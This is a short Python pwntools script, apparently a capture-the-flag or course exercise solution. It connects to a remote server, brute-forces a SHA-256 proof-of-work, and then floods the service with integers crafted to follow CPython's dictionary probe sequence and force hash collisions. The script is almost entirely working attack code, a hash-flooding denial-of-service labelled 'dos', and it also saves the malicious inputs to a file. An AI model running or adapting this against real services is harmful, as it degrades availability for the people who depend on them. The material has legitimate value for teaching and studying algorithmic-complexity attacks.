from pwn import *
import time
import hashlib
import binascii

def sha256(content):
	Hash=hashlib.sha256()
	Hash.update(content)
	return Hash.digest()

def challenge():
	max_nonce = 2**24
	r.recvuntil('with ')
	randomstring = r.recv().decode()[:-2]
	#print(randomstring)
	user = '0'
	for nonce in range(max_nonce):
		hash_tmp = sha256(str(nonce).encode()).encode('hex')
		if hash_tmp[-6:] == "{:0>6}".format(randomstring):
			#print(nonce, hash_tmp, randomstring)
			user = binascii.hexlify(str(nonce).encode()).decode()
			break
	r.send(user+'\n')
	print(r.recvuntil('\n').decode())



r = remote("140.112.31.97", 10159)

### proof-of-work
challenge()

### dos
r.send('50000\n')

### malicious inputs file
f = open('input8.txt', 'w')

d = {}
i, perturb = 1, 1

for n in range(10000):
	d[i] = 1
	r.send(str(i)+'\n')
	f.write(str(i)+'\n')
	i = ((i<<2) + i + perturb + 1) & 0xfffffff
	perturb >>= 5
		

chosen = 0
max_time = 0
for i in range(2**30, 2**30-10000, -1):
	start = time.time()
	for n in range(40000):
		d[i] = 1
	end = time.time()
	if end - start > max_time:
		max_time = end - start
		chosen = i
	del d[i]
#print(chosen)
for n in range(40000):
	r.send(str(chosen)+'\n')
	f.write(str(chosen)+'\n')

print(r.recvuntil('\n').decode())
print(r.recvuntil('\n').decode())
	